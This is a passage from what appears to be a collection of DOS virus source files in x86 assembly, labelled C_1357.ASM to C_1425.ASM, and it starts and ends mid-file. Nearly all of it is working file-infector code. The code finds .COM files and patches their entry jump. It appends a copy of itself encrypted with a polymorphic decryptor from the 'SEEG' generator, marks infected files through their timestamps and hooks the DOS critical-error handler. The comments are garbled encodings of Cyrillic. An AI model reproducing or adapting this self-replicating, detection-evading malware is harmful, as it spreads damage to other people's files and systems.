	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Lea	Si,virn+[Bp]
	Mov	Di,22h
	Push	offset seg_new+[Bp]
	Pop	Es
	Mov	Cx,cod2_lng
	Rep	Movsb
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
	Mov	Ah,2ch	;	    \
	Int	21h	;	     \
	Push	Ds	;	      \
	Mov	Cx,Cod2_Lng /2d	;      \
	Mov	Si,41h		;	\
	Mov	Es:[23h],Dx ;		 \
My:				;         >---------> 1-Ô á†Ë®‰‡Æ¢™† 
	Xor	word ptr Es:[Si],Dx ;    /
	Inc	Si		    ;   /
	Sub	Dx,0DEADh
	Inc	Si		   ;   /
	Loop	My		  ;   /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
	Push	Bx
	Xor	Ax,Ax
	Mov	Al,[Bp]+n_com
	Mov	Bl,03h
	Mul	Bl
	Add	Ax,03h
	Mov	word ptr d_dlina+[Bp],Ax
	Lea	Si,M1+[Bp]
	Xor	Di,Di
	MovSb
	Mov	Bx,offset dlina+[Bp]
	Add	Bx,Ax
	Add	Bx,107h
	Mov	Es:[01h],Bx
	Lea	Si,I1+[Bp]
	Mov	Di,Ax
	Cld
	MovSw
	MovSb
	MovSw
	MovSw
	Add	Bx,lng
	Mov	Si,Ax
	Add	Si,03h
	Mov	Es:[Si],Bx
	Add	Si,03h
	Xor	Bx,Bx
	Sub	Bx,Ax
	Sub	Bx,4h
	Mov	byte ptr Es:[Si],Bl
;-------------------------------	
	Pop	Bx
	Lea	Si,gat+[Bp]
	Mov	Di,5fdh
	MovSb
	MovSw
	Sub	Si,0dh
	Mov	Di,600h
	MovSb
	MovSw
	Lea	Si,I1+[Bp]
	Mov	Di,61bh
	MovSw
	MovSb
	MovSw
	MovSw
	Inc	Si
	Inc	Si
	MovSw	
	Push	Bx
	Cld
	Call	dword ptr cody+[Bp]
	Pop	Bx
dry:
	Xor	Dx,Dx
	Push	Es
	Pop	Ds

	Mov     Cx,Ax
	Add	Cx,7h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,cod2_lng
	Mov	Dx,22h
	Mov     ax,4000h
	Int     21h                   
;-----------------------------------------------------------------------------

	Pop	Ds
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     dx,65055d
	or      dx,01a0h
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h

rt:
	Call	R_Vec24
	Mov	Ah,49h
	Push	Es
	Pop	Bx
	Int	21h
	Push	Cs
	Pop	Es
	Push	Es
	Pop	Ds
	Push	100h
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Ret
sc      ENDP
lng		=	$-Sc
Cod2_lng	=	$-Virn

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1357.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1422.ASM]ƒƒƒ
	.MODEL tiny
	.186
	.code 
	org 100h
start:
	jmp	sc
	db	200d dup(08h)
sc     PROC
	db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
	db      90h,90h,90h     ; \                                     YYY
	db      90h,90h,90h     ;  \                                    YYY
	db      90h,90h,90h     ;   \___DECODER                         YYY
	db      90h,90h,90h     ;   /                                   YYY
	db      90h,90h,90h     ;  /                                    YYY
	db      90h,90h,90h     ; /                                     YYY
	db      90h,90h,90h     ;/                                      YYY
	db      90h             ;-- INC {BX} {SI} {DI}                  Y
	db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
	db      90h,90h         ;-- JB  DECOD                           NY
Virn	PROC
	Mov     dx,0000h  ;--- KEY 
Virt:
	Push    Cs
	Pop     Ss
	Pushf
	Mov     Di,Sp
	Mov     Bx,[Di] 
	Lahf
	Sub     Bx,Ax
	Xchg    Ax,Bx
	Xor     Al,Al
	Sub     Ah,70h
	Push    100h
	Xchg    Al,Ah
	Mov     Cx,4
	Push    Dx
	Mul     Cx
	Pop     Dx
	Sub     Di,Ax
	Mov     Ax,[Di]
	Sub     Ah,72h
	Xor     Al,Al
	Add     Dx,Ax
	Pop     Ax
	Pop     Ax
Virn	ENDP
        Call	opt
opt:	Pop	Bp
	Sub	Bp,offset opt
	Jmp	Cycl
Cd:
	Xor	Bx,Bx
	Jmp	Cycl
Cr:
	Mov	Bh,22h
Cycl:
	Lea     si,vir+[Bp]
	Mov     cx,lng /2d
	Push	Dx
crypt:
	Xor	word ptr [Si],Dx
	Inc	Si
	Sub	Dx,0deadh
	Inc	Si
	loop    crypt
	Pop	Dx
	Cmp	word ptr vir+[Bp],'?\'
	Jz	dr
	Cmp	Bh,22h
	Jne	Cr
	Inc	Dh
	Jmp	Cd
dr:
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
;------------------------------------------------------------------------------
tabl	db	052h, 0fch, 05ah ;\     Nop
	db      0f6h, 017h, 090h ; \	Not b,[??]	+
	db      080h, 037h, 000h ;  \	Xor b,[??],K1	+	Key#-
	db      0c0h, 007h, 000h ;   \	Rol b,[??],K2	+	Key\_
	db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2	+	Key/
	db      0f6h, 01fh, 090h ;    /	Neg b,[??]	+
	db      080h, 007h, 000h ;   /	Add b,[??],K3	+	Key\_
	db      080h, 02fh, 000h ;  /	Sub b,[??],K3	+	Key/
;----------------------------------/
M1	db      0bbh, 022h, 000h 	;---- [ MOV BX,xxxx ]
I1	db	043h			;---- [ INC BX ]
COM	db	081h, 0fbh, 0d2h, 05h   ;---- [ CMP xx,xxxx ]	+
J1	db      072h, 0e1h       	;---- [ JB xx ] e1 - 8
Gat	db	1eh
	db	06h
der	db	1fh
	db	0cbh
;-------------------------------------------------------------------------------------
Cop	db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-",0dh,0ah,"$"
;-------------------------------------------------------------------------------------
one     db      00h  ;\
	db      00h  ; \     
	db      00h  ;  \
	db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
	db      00h  ;   /
	db      00h  ;  /
	db      00h  ; /
	db      00h  ;/
;-----------------------------------------------------------------------
dir	db	00h
cody	db	0fdh,05h
seg_new dd	?
b_reg	db	?
n_com	db	?
d_dlina	dd	?
vec24	dd	?

late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
	Mov	byte ptr dir+[Bp],00h
	Push	Es
	Call	Set_Int_24
	Pop	Es
	Mov	Ax,4900h
	Int	21h
	Jc	rt
	Mov	Ax,4800h
	Mov	Bx,0FFFFh
	Int	21h
	Sub	Bx,70h ;-------\
	Jc	rt
	Mov	Ax,4a00h
	Int	21h
	Mov	Ax,4800h
	Mov	Bx,6fh
	Int	21h
	Jc	Rt
	Mov	word ptr [Bp+seg_new],Ax
	Mov	Es,Ax
	Mov	Al,90h
	Xor	Di,Di
	Mov	Cx,6e0h
	Rep	Stosb
	Mov     Ah,2ch
	Int     21h
	Cmp	Dh,22h
	Jnz	drop
	Call	Mes
drop:
	Call	gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
	Lea	Si,one+[Bp]
	Mov     Ax,Dx
	Xor     Bx,Bx
	Call    rand
	Xor     Ax,1234h
	call    rand
	Mov	Ax,Word Ptr [Si]
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Mov	byte ptr [Bp]+b_reg,Al
	Push	Si
	Lea	Si,tabl+[Bp]
	Call	mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
	Pop	Si
	Mov	ax,word ptr [Si]+01
	Cmp	al,00h
	Jnz	no
	Inc	Ax
no:
	Cmp	byte ptr [Si],00h
	Jnz	mo
	Inc	byte ptr [Si]
mo:
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Inc	Al
	Mov	byte ptr [Bp+n_com],Al
	Xchg	Cx,Ax
	Mov	Ax,word ptr [Bp+seg_new]
	Mov	Es,Ax
	Xor	Ch,Ch
	Xor	Ax,Ax
	Mov	Di,0003h
	Xor	Bx,Bx
	Mov	Dx,24d
Cycle:
	Call	Comp	; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
	Inc	Si
	Add	Bx,0003h
	Sub	Dx,0003h
	Loop	Cycle
	Push	Cs
	Pop	Es
	Jmp	Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
	Cmp     byte ptr [Si],00h
	Jnz     Set_0
	Mov     Al,00d  
	Jmp     vit
Set_0:
	Cmp     byte ptr [Si],01h
	Jnz     Set_1
	Mov     Al,03d  
	Jmp     vit
Set_1:
	Cmp     byte ptr [Si],02h
	Jnz     Set_2
	Mov     Al,06d  
	Jmp     vit
Set_2:
	Cmp     byte ptr [Si],03h
	Jnz     Set_3
	Mov     Al,09d  
	Jmp     vit
Set_3:
	Cmp     byte ptr [Si],04h
	Jnz     Set_4
	Mov     Al,12d  
	Jmp     vit
Set_4:
	Cmp     byte ptr [Si],05h
	Jnz     Set_5
	Mov     Al,15h  
	Jmp     vit
Set_5:
	Cmp     byte ptr [Si],06h
	Jnz     Set_6
	Mov     Al,18d  
	Jmp     vit
Set_6:
	Cmp     byte ptr [Si],07h
	Jnz     Set_7
	Mov     Al,21d  
	Jmp     vit
Set_7:
	Cmp     byte ptr [Si],08h
	Jnz     Set_8
	Mov     Al,21d  
	Jmp     vit
Set_8:
	Cmp     byte ptr [Si],09h
	Jnz     Set_9
	Mov     Al,18d  
	Jmp     vit
Set_9:
	Cmp     byte ptr [Si],0ah
	Jnz     Set_a
	Mov     Al,15d  
	Jmp     vit
Set_a:
	Cmp     byte ptr [Si],0bh
	Jnz     Set_b
	Mov     Al,12d  
	Jmp     vit
Set_b:
	Cmp     byte ptr [Si],0ch
	Jnz     Set_c
	Mov     Al,09d  
	Jmp     vit
Set_c:
	Cmp     byte ptr [Si],0dh
	Jnz     Set_d
	Mov     Al,06d  
	Jmp     vit
Set_d:
	Cmp     byte ptr [Si],0eh
	Jnz     Set_e
	Mov     Al,03d  
	Jmp     vit
Set_e:
	Cmp     byte ptr [Si],0fh
	Jnz     Set_f
	Mov     Al,00h
	Jmp	vit
Set_f:
	Jmp	rt

set:
	Rol Ax,Cl
	Xor Ah,Ah
	Div Ch
	Mov byte ptr [Si]+[Bx],Al
	Inc Bx
	Ret
Mes:
	Push	Dx
	Mov	Ah,09h
	Lea	Dx,Cop+[Bp]
	Int	21h
	Pop	Dx
	Ret

ort:
	Movsb
	Movsw
	ret
res:
	Cmp	Al,09h
	Jnz	d1
	Mov	Al,0ch
	Ret
d1:
	Cmp	Al,0ch
	Jnz	d2
	Mov	Al,09h
	Ret
d2:
	Cmp	Al,12h
	Jnz	d3
	Mov	Al,15h
	Ret
d3:
	Cmp	Al,15h
	Jnz	d4
	Mov	Al,12h
d4:
	Ret

rand:
	push    Ax
	Mov     ch,10h
	Xor     Cl,Cl
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,04h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,08h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,0ch
	Call    set
	Pop     Ax
	Ret

R_Vec24	       PROC
		Push	word ptr Vec24+[Bp]
		Pop	Ds
		Mov	Dx,word ptr Vec24+[Bp]+2
		Mov	Ax,2524h
		Int	21h
		Ret
R_Vec24	       ENDP

Set_Int_24:	Push	Ds
		Push	Bx
		Push	Dx
		Mov	Ax,3524h
		Int	21h
		Mov	word ptr Vec24+[Bp]+2,Bx
		Mov	word ptr Vec24+[Bp],Es
		Push	Cs
		Pop	Ds
		Mov	Ax,2524h
		Lea	Dx,intr24+[Bp]
		Int	21h
		Pop	Dx
		Pop	Bx
		Pop	Ds
		Ret

;Intr21	       PROC
;	db	09ah
;	vector	dd	?
;		ret
;Intr21	       ENDP

Intr24:
	Mov	Al,3h
	Iret

vit:
	Push	Si
	Push	Di
	Push	Si
	Lea     Si,tabl+[Bp]
	Add     Si,Ax
	Add	Di,Bx
	Call    ort
	Pop     Si
	Pop	Di
	Call    res
	Push	Di
	Push	Si
	Lea	Si,tabl+[Bp]
	Add	Si,Ax
	Mov     Di,600h ;-------------------------??????????
	Add	Di,Dx
	Call    ort
	Pop     Si
	Pop	Di
	Pop	Si
	Ret
mreg:
	Cmp	Al,01h
	Jnz	q1
	Jmp	Bx_r
q1:
	Cmp	Al,02h
	Jnz	Si_r
Di_r:
	Mov	byte ptr [Si]+04h,15h
	Mov	byte ptr [Si]+07h,35h
	Mov	byte ptr [Si]+0ah,05h
	Mov	byte ptr [Si]+0dh,0dh
	Mov	byte ptr [Si]+10h,1dh
	Mov	byte ptr [Si]+13h,05h
	Mov	byte ptr [Si]+16h,2dh
	Mov	byte ptr [Si]+18h,0bfh
	Mov	byte ptr [Si]+1bh,47h
	Mov	byte ptr [Si]+1dh,0ffh
	Ret
Si_r:
	Mov	byte ptr [Si]+04h,14h
	Mov	byte ptr [Si]+07h,34h
	Mov	byte ptr [Si]+0ah,04h
	Mov	byte ptr [Si]+0dh,0ch
	Mov	byte ptr [Si]+10h,1ch
	Mov	byte ptr [Si]+13h,04h
	Mov	byte ptr [Si]+16h,2ch
	Mov	byte ptr [Si]+18h,0beh
	Mov	byte ptr [Si]+1bh,46h
	Mov	byte ptr [Si]+1dh,0feh
	Ret
Bx_r:
	Mov	byte ptr [Si]+04h,17h
	Mov	byte ptr [Si]+07h,37h
	Mov	byte ptr [Si]+0ah,07h
	Mov	byte ptr [Si]+0dh,0fh
	Mov	byte ptr [Si]+10h,1fh
	Mov	byte ptr [Si]+13h,07h
	Mov	byte ptr [Si]+16h,2fh
	Mov	byte ptr [Si]+18h,0bbh
	Mov	byte ptr [Si]+1bh,43h
	Mov	byte ptr [Si]+1dh,0fbh
	Ret

gkey:
	Push	Dx
	Mov	[Si]+8h,Dl
	Mov	[Si]+0bh,Dh
	Mov	[Si]+0eh,Dh
	Add	Dh,Dl
	Mov	[Si]+14h,Dh
	Mov	[Si]+17h,Dh
	Pop	Dx
	Ret

;**************************************************** VIRUS START *************
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset time
	and     cx,001ah
	cmp     cx,001ah
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Lea	Si,virn+[Bp]
	Mov	Di,22h
	Push	offset seg_new+[Bp]
	Pop	Es
	Mov	Cx,cod2_lng
	Rep	Movsb
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
	Mov	Ah,2ch	;	    \
	Int	21h	;	     \
	Push	Ds	;	      \
	Mov	Cx,(Cod2_Lng /2d)-20h	;      \
	Mov	Si,85h		;	\
	Mov	Es:[23h],Dx ;		 \
My:				;         >---------> 1-Ô á†Ë®‰‡Æ¢™† 
	Xor	word ptr Es:[Si],Dx ;    /
	Inc	Si		    ;   /
	Sub	Dx,0DEADh
	Inc	Si		   ;   /
	Loop	My		  ;   /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
	Push	Bx
	Xor	Ax,Ax
	Mov	Al,[Bp]+n_com
	Mov	Bl,03h
	Mul	Bl
	Add	Ax,03h
	Mov	word ptr d_dlina+[Bp],Ax
	Lea	Si,M1+[Bp]
	Xor	Di,Di
	MovSb
	Mov	Bx,offset dlina+[Bp]
	Add	Bx,Ax
	Add	Bx,107h
	Mov	Es:[01h],Bx
	Lea	Si,I1+[Bp]
	Mov	Di,Ax
	Cld
	MovSw
	MovSb
	MovSw
	MovSw
	Add	Bx,lng
	Mov	Si,Ax
	Add	Si,03h
	Mov	Es:[Si],Bx
	Add	Si,03h
	Xor	Bx,Bx
	Sub	Bx,Ax
	Sub	Bx,4h
	Mov	byte ptr Es:[Si],Bl
;-------------------------------	
	Pop	Bx
	Lea	Si,gat+[Bp]
	Mov	Di,5fdh
	MovSb
	MovSw
	Sub	Si,0dh
	Mov	Di,600h
	MovSb
	MovSw
	Lea	Si,I1+[Bp]
	Mov	Di,61bh
	MovSw
	MovSb
	MovSw
	MovSw
	Inc	Si
	Inc	Si
	MovSw	
	Push	Bx
	Cld
	Call	dword ptr cody+[Bp]
	Pop	Bx
dry:
	Xor	Dx,Dx
	Push	Es
	Pop	Ds

	Mov     Cx,Ax
	Add	Cx,7h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,cod2_lng
	Mov	Dx,22h
	Mov     ax,4000h
	Int     21h                   
;---------------------------------------------------------------------------

	Pop	Ds
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     cx,0ff0eh
	or      cx,001ah
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h

rt:
	Call	R_Vec24
	Mov	Ah,49h
	Push	Es
	Pop	Bx
	Int	21h
	Push	Cs
	Pop	Es
	Push	Es
	Pop	Ds
	Push	100h
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Ret
sc      ENDP
lng		=	$-Sc
Cod2_lng	=	$-Virn

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1422.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1425.ASM]ƒƒƒ
	.MODEL tiny
	.186
	.code 
	org 100h
start:
	jmp	sc
	db	200d dup(08h)
sc     PROC
	db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
	db      90h,90h,90h     ; \                                     YYY
	db      90h,90h,90h     ;  \                                    YYY
	db      90h,90h,90h     ;   \___DECODER                         YYY
	db      90h,90h,90h     ;   /                                   YYY
	db      90h,90h,90h     ;  /                                    YYY
	db      90h,90h,90h     ; /                                     YYY
	db      90h,90h,90h     ;/                                      YYY
	db      90h             ;-- INC {BX} {SI} {DI}                  Y
	db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
	db      90h,90h         ;-- JB  DECOD                           NY
Virn	PROC
	Mov     dx,0000h  ;--- KEY 
Virt:
	Push    Cs
	Pop     Ss
	Pushf
	Mov     Di,Sp
	Mov     Bx,[Di] 
	Lahf
	Sub     Bx,Ax
	Xchg    Ax,Bx
	Xor     Al,Al
	Sub     Ah,70h
	Push    100h
	Xchg    Al,Ah
	Mov     Cx,4
	Push    Dx
	Mul     Cx
	Pop     Dx
	Sub     Di,Ax
	Mov     Ax,[Di]
	Sub     Ah,72h
	Xor     Al,Al
	Add     Dx,Ax
	Pop     Ax
	Pop     Ax
Virn	ENDP
        Call	opt
opt:	Pop	Bp
	Sub	Bp,offset opt
	Jmp	Cycl
Cd:
	Xor	Bx,Bx
	Jmp	Cycl
Cr:
	Mov	Bh,22h
Cycl:
	Lea     si,vir+[Bp]
	Mov     cx,lng /2d
	Push	Dx
crypt:
	Xor	word ptr [Si],Dx
	Inc	Si
	Sub	Dx,0deadh
	Inc	Si
	loop    crypt
	Pop	Dx
	Cmp	word ptr vir+[Bp],'?\'
	Jz	dr
	Cmp	Bh,22h
	Jne	Cr
	Inc	Dh
	Jmp	Cd
dr:
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
;------------------------------------------------------------------------------
tabl	db	052h, 0fch, 05ah ;\     Nop
	db      0f6h, 017h, 090h ; \	Not b,[??]	+
	db      080h, 037h, 000h ;  \	Xor b,[??],K1	+	Key#-
	db      0c0h, 007h, 000h ;   \	Rol b,[??],K2	+	Key\_
	db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2	+	Key/
	db      0f6h, 01fh, 090h ;    /	Neg b,[??]	+
	db      080h, 007h, 000h ;   /	Add b,[??],K3	+	Key\_
	db      080h, 02fh, 000h ;  /	Sub b,[??],K3	+	Key/
;					Dec b,[??]	+
;					inc b,[??]	+
;musor	db	AX CX DX BP
;----------------------------------/
M1	db      0bbh, 022h, 000h 	;---- [ MOV BX,xxxx ]
I1	db	043h			;---- [ INC BX ]
COM	db	081h, 0fbh, 0d2h, 05h   ;---- [ CMP xx,xxxx ]	+
J1	db      072h, 0e1h       	;---- [ JB xx ] e1 - 8
Gat	db	1eh
	db	06h
der	db	1fh
	db	0cbh
;-------------------------------------------------------------------------------------
Cop	db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-",0dh,0ah,"$"
;-------------------------------------------------------------------------------------
one     db      00h  ;\
	db      00h  ; \     
	db      00h  ;  \
	db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
	db      00h  ;   /
	db      00h  ;  /
	db      00h  ; /
	db      00h  ;/
;-----------------------------------------------------------------------
dir	db	00h
cody	db	0fdh,05h
seg_new dd	?
b_reg	db	?
n_com	db	?
d_dlina	dd	?
vec24	dd	?

late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
	Mov	byte ptr dir+[Bp],00h
	Push	Es
	Call	Set_Int_24
	Pop	Es
	Mov	Ax,4900h
	Int	21h
	Jc	rt
	Mov	Ax,4800h
	Mov	Bx,0FFFFh
	Int	21h
	Sub	Bx,70h ;-------\
	Jc	rt
	Mov	Ax,4a00h
	Int	21h
	Mov	Ax,4800h
	Mov	Bx,6fh
	Int	21h
	Jc	Rt
	Mov	word ptr [Bp+seg_new],Ax
	Mov	Es,Ax
	Mov	Al,90h
	Xor	Di,Di
	Mov	Cx,6e0h
	Rep	Stosb
	Mov     Ah,2ch
	Int     21h
	Cmp	Dh,22h
	Jnz	drop
	Call	Mes
drop:
	Call	gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
	Lea	Si,one+[Bp]
	Mov     Ax,Dx
	Xor     Bx,Bx
	Call    rand
	Xor     Ax,1234h
	call    rand
	Mov	Ax,Word Ptr [Si]
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Mov	byte ptr [Bp]+b_reg,Al
	Push	Si
	Lea	Si,tabl+[Bp]
	Call	mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
	Pop	Si
	Mov	ax,word ptr [Si]+01
	Cmp	al,00h
	Jnz	no
	Inc	Ax
no:
	Cmp	byte ptr [Si],00h
	Jnz	mo
	Inc	byte ptr [Si]
mo:
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Inc	Al
	Mov	byte ptr [Bp+n_com],Al
	Xchg	Cx,Ax
	Mov	Ax,word ptr [Bp+seg_new]
	Mov	Es,Ax
	Xor	Ch,Ch
	Xor	Ax,Ax
	Mov	Di,0003h
	Xor	Bx,Bx
	Mov	Dx,24d
Cycle:
	Call	Comp	; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
	Inc	Si
	Add	Bx,0003h
	Sub	Dx,0003h
	Loop	Cycle
	Push	Cs
	Pop	Es
	Jmp	Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
	Cmp     byte ptr [Si],00h
	Jnz     Set_0
	Mov     Al,00d  
	Jmp     vit
Set_0:
	Cmp     byte ptr [Si],01h
	Jnz     Set_1
	Mov     Al,03d  
	Jmp     vit
Set_1:
	Cmp     byte ptr [Si],02h
	Jnz     Set_2
	Mov     Al,06d  
	Jmp     vit
Set_2:
	Cmp     byte ptr [Si],03h
	Jnz     Set_3
	Mov     Al,09d  
	Jmp     vit
Set_3:
	Cmp     byte ptr [Si],04h
	Jnz     Set_4
	Mov     Al,12d  
	Jmp     vit
Set_4:
	Cmp     byte ptr [Si],05h
	Jnz     Set_5
	Mov     Al,15h  
	Jmp     vit
Set_5:
	Cmp     byte ptr [Si],06h
	Jnz     Set_6
	Mov     Al,18d  
	Jmp     vit
Set_6:
	Cmp     byte ptr [Si],07h
	Jnz     Set_7
	Mov     Al,21d  
	Jmp     vit
Set_7:
	Cmp     byte ptr [Si],08h
	Jnz     Set_8
	Mov     Al,21d  
	Jmp     vit
Set_8:
	Cmp     byte ptr [Si],09h
	Jnz     Set_9
	Mov     Al,18d  
	Jmp     vit
Set_9:
	Cmp     byte ptr [Si],0ah
	Jnz     Set_a
	Mov     Al,15d  
	Jmp     vit
Set_a:
	Cmp     byte ptr [Si],0bh
	Jnz     Set_b
	Mov     Al,12d  
	Jmp     vit
Set_b:
	Cmp     byte ptr [Si],0ch
	Jnz     Set_c
	Mov     Al,09d  
	Jmp     vit
Set_c:
	Cmp     byte ptr [Si],0dh
	Jnz     Set_d
	Mov     Al,06d  
	Jmp     vit
Set_d:
	Cmp     byte ptr [Si],0eh
	Jnz     Set_e
	Mov     Al,03d  
	Jmp     vit
Set_e:
	Cmp     byte ptr [Si],0fh
	Jnz     Set_f
	Mov     Al,00h
	Jmp	vit
Set_f:
	Jmp	rt

set:
	Rol Ax,Cl
	Xor Ah,Ah
	Div Ch
